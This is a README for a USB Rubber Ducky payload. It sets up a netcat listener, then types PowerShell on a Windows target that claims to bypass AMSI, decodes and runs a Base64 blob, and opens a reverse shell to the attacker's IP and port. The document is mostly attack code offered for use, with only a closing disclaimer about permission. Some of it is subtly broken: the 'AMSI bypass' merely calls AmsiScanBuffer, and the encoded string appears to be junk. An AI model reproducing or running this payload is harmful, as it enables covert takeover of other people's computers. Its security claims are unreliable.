# ShadowPuppet Payload

## Overview

**ShadowPuppet** is a USB Rubber Ducky payload designed to bypass Windows' AMSI (Antimalware Scan Interface), download a hidden payload, and establish a reverse shell back to the attacker's machine. It takes advantage of PowerShell to execute the payload, and it uses obfuscation techniques to avoid detection.

---

## Key Features

* **AMSI Bypass**: A clever trick to bypass Windows' built-in malware protection system (AMSI).
* **Obfuscated Payload**: Payloads are Base64 encoded to hide their true nature from security tools.
* **Reverse Shell**: Opens a connection back to the attacker’s machine, giving full control over the target device.

---

## Requirements

Before using **ShadowPuppet**, you’ll need:

1. **USB Rubber Ducky**: This is a USB device that mimics a keyboard and automatically types out commands on the target system.
2. **PowerShell**: By default, PowerShell should be available on Windows systems.
3. **Attacker’s Machine**: The device used to receive the reverse shell connection.

   * Replace `YOUR_IP_ADDRESS` with the IP address of your machine.
   * Replace `YOUR_PORT` with the port you want to listen on for the reverse shell.

---

## Setting Up the Attacker's Machine

1. **Set up a listener** on the attacker's machine. You can use **Netcat** for this:

   ```bash
   nc -lvp YOUR_PORT
   ```

   This will open a listener on the specified port that waits for incoming connections.

2. **Compile the Payload**:

   Copy the code provided below into a text file called `payload.txt` and then use **DuckEncoder** to convert it into a `inject.bin` file.

   * Download DuckEncoder: [DuckEncoder GitHub](https://github.com/hak5darren/USB-Rubber-Ducky/wiki/DuckEncoder).
   * Run the following command to compile the payload:

     ```bash
     java -jar DuckEncoder.jar -i payload.txt -o inject.bin
     ```

3. **Deploy the Payload**:

   * Copy the compiled `inject.bin` onto the **USB Rubber Ducky**.
   * Insert the **USB Rubber Ducky** into the target machine.
   * The payload will run automatically, bypassing AMSI and opening the reverse shell.

---

## The Payload Code

Here’s the code in `payload.txt` that you will compile and load onto the Rubber Ducky:

```plaintext
DELAY 500
GUI r
DELAY 500
STRING powershell
ENTER
DELAY 1000

REM Bypass AMSI using reflection
STRING Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class AMSI {
    [DllImport("amsi.dll", SetLastError = true)]
    public static extern int AmsiScanBuffer(IntPtr amsiContext, byte[] buffer, int length, out int result);
}
"@
ENTER
DELAY 500
STRING $null = [AMSI]::AmsiScanBuffer(0, [System.Text.Encoding]::ASCII.GetBytes("malicious code"), 20, [ref]$null)
ENTER

DELAY 500

REM Obfuscated payload downloader using PowerShell
STRING $payload = "JAB3AHYAYwB6aXn4cTp2YfhgA2Stw5kOrP5pQ5O72cm8aLg72g=="  
ENTER
DELAY 500
STRING $decoded = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($payload))
ENTER
DELAY 500
STRING Invoke-Expression $decoded
ENTER

DELAY 500
STRING Write-Host "Payload executed successfully."
ENTER

DELAY 500

REM Reverse Shell Setup (Example)
STRING $ip = "YOUR_IP_ADDRESS"
ENTER
DELAY 500
STRING $port = "YOUR_PORT"
ENTER
DELAY 500
STRING $client = New-Object System.Net.Sockets.TCPClient($ip, $port)
ENTER
DELAY 500
STRING $stream = $client.GetStream()
ENTER
DELAY 500
STRING [byte[]]$bytes = 0..255|%{0}
ENTER
DELAY 500
STRING while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
ENTER
DELAY 500
STRING     $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
ENTER
DELAY 500
STRING     $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
ENTER
DELAY 500
STRING     $sendback2 = $sendback + "PS " + (pwd).Path + "> "
ENTER
DELAY 500
STRING     $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
ENTER
DELAY 500
STRING     $stream.Write($sendbyte, 0, $sendbyte.Length)
ENTER
DELAY 500
STRING     $stream.Flush()
ENTER
DELAY 500
STRING }
ENTER

DELAY 500
STRING Write-Host "Reverse shell initiated."
ENTER
```

---

## Important Notes

* **Replace IP and Port**: Don't forget to replace `YOUR_IP_ADDRESS` and `YOUR_PORT` with the IP and port you are listening on.
* **Testing**: Only test this in controlled environments where you have explicit permission. Unauthorized use is illegal.
* **Ethical Use**: This tool is designed for penetration testing, ethical hacking, and educational purposes only. Do not use it on systems without consent.

---

## Legal Disclaimer

By using this payload, you acknowledge that you are conducting this activity in an authorized and ethical manner. Unauthorized access to computer systems is illegal and can result in criminal charges. This tool is for educational use only, and you should only use it for legitimate security testing, like in penetration testing environments or bug bounty programs where you have written permission to test systems.
